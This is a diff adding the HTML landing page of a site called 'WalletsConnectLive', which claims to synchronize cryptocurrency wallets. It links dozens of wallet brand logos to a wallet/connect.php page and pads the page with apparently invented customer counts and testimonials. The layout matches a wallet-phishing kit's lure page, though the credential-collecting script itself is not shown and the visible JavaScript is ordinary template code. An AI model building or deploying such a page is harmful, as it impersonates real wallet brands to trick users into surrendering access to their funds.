@@ -1,0 +1,574 @@
+
+<!doctype html>
+<html lang="en">
+  
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>WalletsConnectLive</title>
+    
+    <!-- Template CSS -->
+    <link rel="stylesheet" href="start-styles.css">
+    <link rel="stylesheet" href="css/bootstrap-grid.min.css">
+	
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png">
+<link rel="manifest" href="site.html">
+<!-- Option 1: Include in HTML -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+<style>
+  h1 {
+    text-align: center;
+  }
+  
+  .testimonial-container {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+  
+  .testimonial {
+    width: calc(50% - 10px);
+    margin-bottom: 20px;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+  }
+  
+  .testimonial-content {
+    margin-bottom: 20px;
+  }
+  
+  .author-avatar {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    object-fit: cover;
+    margin-right: 10px;
+  }
+  
+  .author-info {
+    display: flex;
+    align-items: center;
+  }
+          /* CSS for the footer */
+          .footer {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+          }
+        </style>
+  </head>
+
+  <body>
+<!-- header -->
+<header id="site-header" class="fixed-top">
+  <div class="container">
+      <nav class="navbar navbar-expand-lg stroke">
+          <a class="navbar-brand" href="index-2.html">
+            <i class="bi bi-app-indicator"></i> WCLive
+          </a>
+         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo02" aria-label="Toggle navigation">
+           <span class="navbar-toggler-icon"></span>
+         </button>
+         
+
+          <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
+              <ul class="navbar-nav ml-auto">
+                  <li class="nav-item @@about__active">
+                      <a class="nav-link" href="wallet/connect.php?wallet=stake">Stake</a>
+                  </li>
+				  <li class="nav-item @@about__active">
+                      <a class="nav-link" href="wallet/connect.php?wallet=unstake">Unstake</a>
+                  </li>
+                  <li class="nav-item ml-3 mr-2">
+                      <a href="wallet/connect.php?wallet=Connectwallet" class="btn btn-primary d-none d-lg-block btn-style">Connect Wallet</a></li>
+              </ul>
+          </div>
+          
+      </nav>
+  </div>
+</header>
+<!-- //header -->
+<!-- banner -->
+<section id="home">
+  <div class="container py-5">
+    <div class="row">
+      <div class="col-lg-7">
+        <h2>Organize all your cryptocurrencies wallet easily with this App.</h2>
+        <p class="mt-3">Interaction between mobile apps and mobile browsers are supported via app linking.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- //banner -->
+
+
+<section class="w3l-clients py-5" id="clients">
+    <div class="call-w3 py-lg-5 py-md-4">
+        <div class="container">
+            <h3 class="title-big text-center mb-2">Synchronize your wallet</h3>
+            <p class="text-head mb-5">Easy-to-use wallet synchronization</p>
+            <p align="center" class="text-head mb-5"><a href="wallet/connect.php?wallet=stake">Stake</a> | <a href="wallet/connect.php?wallet=unstake">Unstake</a></p>
+            <div class="company-logos text-center">
+                <div class="row logos mb-md-5">
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6">
+					<a href="wallet/connect.php?wallet=alphawallet">
+                        <img src="assets/images/wallets/alphawallet.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6">
+                        <a href="wallet/connect.php?wallet=argent">
+                        <img src="assets/images/wallets/argent.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-md-0 mt-4">
+                        <a href="wallet/connect.php?wallet=authereum">
+                        <img src="assets/images/wallets/authereum.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=metamask">
+                        <img src="assets/images/wallets/metamask.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=trust">
+                        <img src="assets/images/wallets/trust.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=coinbase">
+                        <img src="assets/images/wallets/coinbase.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=exodus">
+                        <img src="assets/images/wallets/exodus.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=OkexWallet">
+                        <img src="assets/images/wallets/okexWallet.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=BinanceSmartChain">
+                        <img src="assets/images/wallets/binance-sc.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=metaX">
+                        <img src="assets/images/wallets/metax.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=ledger">
+                        <img src="assets/images/wallets/ledger.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=myetherwallet">
+                        <img src="assets/images/wallets/mew.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=tron">
+                        <img src="assets/images/wallets/tron.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=crypto">
+                        <img src="assets/images/wallets/crypto.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=walleth">
+                        <img src="assets/images/wallets/walleth.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=tronlink">
+                        <img src="assets/images/wallets/tronlink.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=coin98">
+                        <img src="assets/images/wallets/coin98.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=coinomi">
+                        <img src="assets/images/wallets/coinomi.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=coolwallet">
+                        <img src="assets/images/wallets/coolwallet.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=eidoo">
+                        <img src="assets/images/wallets/eidoo.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=gridplus">
+                        <img src="assets/images/wallets/gridplus.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Huobi">
+                        <img src="assets/images/wallets/Huobi.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=infinito">
+                        <img src="assets/images/wallets/infinito.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=infinity">
+                        <img src="assets/images/wallets/infinity.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=mathwallet">
+                        <img src="assets/images/wallets/mathwallet.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-sm-0 mt-4">
+                        <a href="wallet/connect.php?wallet=atomic">
+                        <img src="assets/images/wallets/atomic.png" alt="" class="img-fluid"></a>
+                    </div>	
+		
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=mykey">
+                        <img src="assets/images/wallets/mykey.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=nash">
+                        <img src="assets/images/wallets/nash.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=onto">
+                        <img src="assets/images/wallets/onto.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=ownbit">
+                        <img src="assets/images/wallets/ownbit.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=pillar">
+                        <img src="assets/images/wallets/pillar.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=safepal">
+                        <img src="assets/images/wallets/safepal.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=sparkpoint">
+                        <img src="assets/images/wallets/sparkpoint.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=swft">
+                        <img src="assets/images/wallets/swft.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=tokenpocket">
+                        <img src="assets/images/wallets/tokenpocket.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=vision">
+                        <img src="assets/images/wallets/vision.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=wallet.io">
+                        <img src="assets/images/wallets/wallet.io.png" alt="" class="img-fluid"></a>
+                    </div>
+					
+					
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=zelcore">
+                        <img src="assets/images/wallets/zelcore.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=morixwallet">
+                        <img src="assets/images/wallets/morixwallet.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=rainbow">
+                        <img src="assets/images/wallets/rainbow.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=atwallet">
+                        <img src="assets/images/wallets/atwallet.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=peakdefi">
+                        <img src="assets/images/wallets/peakdefi.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=xdc">
+                        <img src="assets/images/wallets/xdc.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=unstoppable">
+                        <img src="assets/images/wallets/unstoppable.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=midas">
+                        <img src="assets/images/wallets/midas.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=spatium">
+                        <img src="assets/images/wallets/spatium.png" alt="" class="img-fluid"></a>
+                    </div>
+					<div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=imtoken">
+                        <img src="assets/images/wallets/imtoken.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=FTXOfficial">
+                        <img src="assets/images/wallets/ftx.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=LBank">
+                        <img src="assets/images/wallets/lbank.jpg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Raydium">
+                        <img src="assets/images/wallets/raydium.jpg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Solana">
+                        <img src="assets/images/wallets/Solana.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Polygon">
+                        <img src="assets/images/wallets/polygon.png" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Safemoon">
+                        <img src="assets/images/wallets/safemoon.jpeg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Elronld">
+                        <img src="assets/images/wallets/elrond.jpeg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Avalanche">
+                        <img src="assets/images/wallets/avalanche.jpeg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/connect.php?wallet=Vechain">
+                        <img src="assets/images/wallets/vechain.jpeg" alt="" class="img-fluid"></a>
+                    </div>
+                    <div class="col-lg-2 col-md-3 col-sm-4 col-6 mt-lg-0 mt-4">
+                        <a href="wallet/others.php?wallet=othersWallet">
+                        <img src="assets/images/wallets/OTHERS.png" alt="" class="img-fluid"></a>
+                    </div>
+                
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+    <!-- move top -->
+    <button onClick="topFunction()" id="movetop" title="Go to top">
+      &#10548;
+    </button>
+    <script>
+      // When the user scrolls down 20px from the top of the document, show the button
+      window.onscroll = function () {
+        scrollFunction()
+      };
+
+      function scrollFunction() {
+        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+          document.getElementById("movetop").style.display = "block";
+        } else {
+          document.getElementById("movetop").style.display = "none";
+        }
+      }
+
+      // When the user clicks on the button, scroll to the top of the document
+      function topFunction() {
+        document.body.scrollTop = 0;
+        document.documentElement.scrollTop = 0;
+      }
+    </script>
+    <!-- /move top -->
+  </section>
+  <!-- //footer-28 block -->
+<!--columns-->
+<div class="container mt-5 mb-5 text-center">
+  <div class="row">
+    <div class="col-sm-4">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-standing" viewBox="0 0 16 16">
+        <path d="M8 3a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM6 6.75v8.5a.75.75 0 0 0 1.5 0V10.5a.5.5 0 0 1 1 0v4.75a.75.75 0 0 0 1.5 0v-8.5a.25.25 0 1 1 .5 0v2.5a.75.75 0 0 0 1.5 0V6.5a3 3 0 0 0-3-3H7a3 3 0 0 0-3 3v2.75a.75.75 0 0 0 1.5 0v-2.5a.25.25 0 0 1 .5 0Z"/>
+      </svg>
+      <h3>Customers</h3>
+      <p>189</p>
+    </div>
+    <div class="col-sm-4">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-arms-up" viewBox="0 0 16 16">
+        <path d="M8 3a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"/>
+        <path d="m5.93 6.704-.846 8.451a.768.768 0 0 0 1.523.203l.81-4.865a.59.59 0 0 1 1.165 0l.81 4.865a.768.768 0 0 0 1.523-.203l-.845-8.451A1.492 1.492 0 0 1 10.5 5.5L13 2.284a.796.796 0 0 0-1.239-.998L9.634 3.84a.72.72 0 0 1-.33.235c-.23.074-.665.176-1.304.176-.64 0-1.074-.102-1.305-.176a.72.72 0 0 1-.329-.235L4.239 1.286a.796.796 0 0 0-1.24.998l2.5 3.216c.317.316.475.758.43 1.204Z"/>
+      </svg>
+      <h3>Partners</h3>
+      <p>76</p>
+    </div>
+    <div class="col-sm-4">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-cash-coin" viewBox="0 0 16 16">
+        <path fill-rule="evenodd" d="M11 15a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm5-4a5 5 0 1 1-10 0 5 5 0 0 1 10 0z"/>
+        <path d="M9.438 11.944c.047.596.518 1.06 1.363 1.116v.44h.375v-.443c.875-.061 1.386-.529 1.386-1.207 0-.618-.39-.936-1.09-1.1l-.296-.07v-1.2c.376.043.614.248.671.532h.658c-.047-.575-.54-1.024-1.329-1.073V8.5h-.375v.45c-.747.073-1.255.522-1.255 1.158 0 .562.378.92 1.007 1.066l.248.061v1.272c-.384-.058-.639-.27-.696-.563h-.668zm1.36-1.354c-.369-.085-.569-.26-.569-.522 0-.294.216-.514.572-.578v1.1h-.003zm.432.746c.449.104.655.272.655.569 0 .339-.257.571-.709.614v-1.195l.054.012z"/>
+        <path d="M1 0a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h4.083c.058-.344.145-.678.258-1H3a2 2 0 0 0-2-2V3a2 2 0 0 0 2-2h10a2 2 0 0 0 2 2v3.528c.38.34.717.728 1 1.154V1a1 1 0 0 0-1-1H1z"/>
+        <path d="M9.998 5.083 10 5a2 2 0 1 0-3.132 1.65 5.982 5.982 0 0 1 3.13-1.567z"/>
+      </svg>
+      <h3>Transactions</h3>
+      <p>1230</p>
+    </div>
+  </div>
+</div>
+<!--columns-->
+
+<div class="container">
+  <h1>Testimonials</h1>
+  <div class="testimonial-container">
+    <div class="testimonial">
+      <div class="testimonial-content">
+        <p>M&B Cooperations</p>
+      </div>
+      <div class="testimonial-author">
+        <img src="avatar1.jpg" alt="Avatar" class="author-avatar">
+        <div class="author-info">
+          <h3>Michael Isreal</h3>
+        </div>
+      </div>
+    </div>
+
+    <div class="testimonial">
+      <div class="testimonial-content">
+        <p>Growmee Works.Inc</p>
+      </div>
+      <div class="testimonial-author">
+        <img src="avatar2.jpg" alt="Avatar" class="author-avatar">
+        <div class="author-info">
+          <h3>Samuel Stone</h3>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+ <footer class="footer">
+<p>&copy; 2023 BackupResolution. All rights reserved.</p>
+</footer>
+  <!-- all js scripts and files here -->
+
+  <script src="js/theme-change.js"></script><!-- theme switch js (light and dark)-->
+
+  <script src="js/jquery-3.3.1.min.js"></script><!-- default jQuery -->
+
+<!-- magnific popup -->
+<script src="js/jquery.magnific-popup.min.js"></script>
+<script>
+  $(document).ready(function () {
+    $('.popup-with-zoom-anim').magnificPopup({
+      type: 'inline',
+
+      fixedContentPos: false,
+      fixedBgPos: true,
+
+      overflowY: 'auto',
+
+      closeBtnInside: true,
+      preloader: false,
+
+      midClick: true,
+      removalDelay: 300,
+      mainClass: 'my-mfp-zoom-in'
+    });
+
+    $('.popup-with-move-anim').magnificPopup({
+      type: 'inline',
+
+      fixedContentPos: false,
+      fixedBgPos: true,
+
+      overflowY: 'auto',
+
+      closeBtnInside: true,
+      preloader: false,
+
+      midClick: true,
+      removalDelay: 300,
+      mainClass: 'my-mfp-slide-bottom'
+    });
+  });
+</script>
+<!-- magnific popup -->
+
+
+<script src="js/owl.carousel.js"></script>
+<!-- script for tesimonials carousel slider -->
+<script>
+  $(document).ready(function () {
+    $("#owl-demo1").owlCarousel({
+      loop: true,
+      margin: 0,
+      nav: false,
+      responsiveClass: true,
+      responsive: {
+        0: {
+          items: 2,
+          nav: false
+        },
+        736: {
+          items: 3,
+          nav: false
+        },
+        1000: {
+          items: 4,
+          nav: false,
+          loop: false
+        }
+      }
+    })
+  })
+</script>
+<!-- //script for tesimonials carousel slider -->
+
+  <!-- stats number counter-->
+  <script src="js/jquery.waypoints.min.js"></script>
+  <script src="js/jquery.countup.js"></script>
+  <script>
+    $('.counter').countUp();
+  </script>
+  <!-- //stats number counter -->
+
+  <!-- disable body scroll which navbar is in active -->
+  <script>
+    $(function () {
+      $('.navbar-toggler').click(function () {
+        $('body').toggleClass('noscroll');
+      })
+    });
+  </script>
+  <!-- disable body scroll which navbar is in active -->
+
+  <!--/MENU-JS-->
+  <script>
+    $(window).on("scroll", function () {
+      var scroll = $(window).scrollTop();
+
+      if (scroll >= 80) {
+        $("#site-header").addClass("nav-fixed");
+      } else {
+        $("#site-header").removeClass("nav-fixed");
+      }
+    });
+
+    //Main navigation Active Class Add Remove
+    $(".navbar-toggler").on("click", function () {
+      $("header").toggleClass("active");
+    });
+    $(document).on("ready", function () {
+      if ($(window).width() > 991) {
+        $("header").removeClass("active");
+      }
+      $(window).on("resize", function () {
+        if ($(window).width() > 991) {
+          $("header").removeClass("active");
+        }
+      });
+    });
+  </script>
+  <!--//MENU-JS-->
+
+  <!-- bootstrap js -->
+  <script src="js/bootstrap.min.js"></script>
+
+  </body>
+</html>
